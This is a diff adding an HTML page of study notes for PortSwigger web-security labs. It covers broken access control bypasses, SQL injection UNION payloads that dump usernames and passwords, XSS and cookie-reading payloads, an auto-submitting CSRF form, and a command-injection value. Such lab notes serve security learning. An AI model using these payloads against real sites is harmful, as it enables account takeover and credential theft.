@@ -1,0 +1,149 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Portswigger Labs</title>
+</head><body><span style="font-size: 14pt">1. BROKEN ACCESS CONTROL<br/>
+# Unprotected admin panel<br/>
+# /robots.txt reveal hidden directories<br/>
+target.com/robots.txt<br/>
+target.com/administrator-panel<br/>
+<br/>
+# No robots.txt?<br/>
+# obsfucated admin panel name was written explicitly in javascript (inspector)<br/>
+<br/>
+# Log in as normal account<br/>
+# Edit cookie Admin=true<br/>
+<br/>
+# Remember to check every feature/clickable. You might find a vulnerability<br/>
+# Log in as normal account<br/>
+# Update email<br/>
+# Email seen in JSON parameter<br/>
+# Add into JSON parameter: "roleid":2<br/>
+<br/>
+# Restrict access to specific URL<br/>
+DENY: POST, /admin/deleteUser, managers<br/>
+<br/>
+# Bypass with example request below:<br/>
+POST / HTTP/1.1<br/>
+X-Original-URL: /admin/deleteUser<br/>
+# X-Rewrite-URL method is also an option<br/>
+<br/>
+# Log in as normal account<br/>
+# Bypass access admin page<br/>
+GET / HTTP/2<br/>
+X-Original-Url: /admin<br/>
+<br/>
+# Put query in the real URL to delete user<br/>
+GET /?username=carlos HTTP/2<br/>
+X-Original-Url: /admin/delete<br/>
+<br/>
+# Horizontal Privilege Escalation<br/>
+# Change user id in parameter<br/>
+target.com/my-account?id=<b>carlos</b><br/>
+<br/>
+# User id obsfucated with GUID<br/>
+target.com/my-account?id=<b>91ec7f6d-9510-422d-98b5-35c90c52154a</b><br/>
+# Find interface that would lead hint to target account<br/>
+# Click and you'll find the target's id<br/>
+<br/>
+# access to account id via parameter is restricted (redirected to login page instead)<br/>
+# Info still leaked in the response tho<br/>
+<br/>
+# IDOR<br/>
+# Live chat but logged into txt files<br/>
+# Download transcript get 2.txt, 3.txt, and so on<br/>
+# Change the url to get 1.txt instead<br/>
+# Password found there in the chat log<br/>
+<br/>
+# Method Based Access<br/>
+# Log in as administrator:admin<br/>
+# In admin panel, try to promote user into admin<br/>
+# Check burp suite, send request to repeater<br/>
+# Log into wiener:peter<br/>
+# Replace admin cookie session with wiener's<br/>
+# POST result: "Unauthorized"<br/>
+# POSTX result: Missing parameter username<br/>
+# <b>GET /admin-roles?username=wiener&amp;action=upgrade</b><br/>
+<br/>
+# Multiple Step Access Control, but no control on one step<br/>
+# Find one where the access step is not controlled<br/>
+# Dont forget to replace admin cookie session with wiener's<br/>
+<br/>
+# Referer Based Access Control (the title is already self-explanatory)<br/>
+<br/>
+<br/>
+2. SQL INJECTION<br/>
+<br/>
+# Show all categories and hiddens<br/>
+'<b>Gifts' OR 1=1--</b>'<br/>
+<br/>
+# Bypass administrator login<br/>
+'<b>administrator'--</b>'<br/>
+<br/>
+# Find column width<br/>
+'<b>ORDER BY 1--</b>'<br/>
+'<b>ORDER BY 2--</b>'<br/>
+'<b>ORDER BY 3--</b>' # if error here &gt;&gt; column = 2<br/>
+<br/>
+# Show version Oracle<br/>
+# 'dual' is Oracle's built-in table; 'a' and 'b' are placeholders<br/>
+'<b>' UNION SELECT 'A','B' FROM dual--</b>'<br/>
+'<b>' UNION SELECT BANNER,'b' FROM v$version--</b>'<br/>
+<br/>
+# Show version MySQL, Microsoft.<br/>
+'<b>' UNION SELECT @@version,'b'#</b>'<br/>
+<br/>
+# Non-Oracle<br/>
+# Find table names<br/>
+'<b>' UNION SELECT TABLE_NAME,TABLE_TYPE FROM information_schema.tables--</b>'<br/>
+# Find column names in table<br/>
+'<b>' UNION SELECT COLUMN_NAME, TABLE_NAME FROM information_schema.columns WHERE table_name='users_vuavlr'--</b>'<br/>
+# Print data from specific columns in a table<br/>
+'<b>' UNION SELECT username_slusfk,password_pjmzqj FROM users_vuavlr--</b>'<br/>
+<br/>
+# Oracle<br/>
+<b>' UNION SELECT 'A','B' FROM dual--</b><br/>
+<b>' UNION SELECT table_name,'B' FROM all_tables--<br/>
+' UNION SELECT table_name,column_name FROM all_tab_columns WHERE table_name = 'USERS_MFVYXZ'--<br/>
+</b><b>' UNION SELECT USERNAME_EECUCO,PASSWORD_MSNVJT FROM USERS_MFVYXZ--</b><br/>
+<br/>
+# Finding Column containing text (non-Oracle)<br/>
+# Find column width first (ORDER BY) &gt;&gt; result: 3<br/>
+# Use NULL because it's compactible with most data types<br/>
+<b>' UNION SELECT NULL,NULL,NULL--</b><br/>
+# Try string value in each NULL, which one doesn't produce error.<br/>
+<b>' UNION SELECT NULL,'A',NULL--<br/>
+<br/>
+</b># Data from other table<b><br/>
+</b><b>' UNION SELECT username,password FROM users--</b><br/>
+# Multiple datas in one column from other table<br/>
+<b>' UNION SELECT NULL,username || ' ' || password FROM users--</b><br/>
+<br/>
+3. XSS<br/>
+# Try input boxes<br/>
+# Observe parameters in the URL<br/>
+# Inspect where your payloads are placed in the HTML structure<br/>
+<b>&lt;script&gt;alert(1)&lt;/script&gt;</b><br/>
+<b>&lt;img src=1 onerror=alert(1)&gt; </b># bypass innerHTML encoding<br/>
+&lt;a id="backLink" href="<b>javascript:alert(document.cookie)</b>"&gt;Back&lt;/a&gt;<br/>
+<b>"onmouseover=alert(1)"</b>&nbsp;# bypass &lt;&gt; HTML encode<br/>
+<b>"onclick=prompt(8)&gt;"@x.y</b><br/>
+<b>'-alert(1)-'</b>&nbsp;# bypass &lt;&gt; HTML encode<br/>
+<b>'-prompt(8)-'<br/>
+<br/>
+</b>4. CSRF<br/>
+&lt;form method="POST" action="https://unique-lab-id.web-security-academy.net/my-account/change-email"&gt;<br/>
+&nbsp; &nbsp; &lt;input type="hidden" name="email" value="you-are@hacked"&gt;<br/>
+&lt;/form&gt;<br/>
+&lt;script&gt;<br/>
+&nbsp; &nbsp; document.forms[0].submit(); # Makes the form auto-submit<br/>
+&lt;/script&gt;<br/>
+<br/>
+5. OS COMMAND INJECTION<br/>
+# Intercept function in Burp Suite, tamper the parameter<br/>
+id=2; whoami<br/>
+<br/>
+<br/>
+<br/>
+&lt;END&gt;</span></body></html>
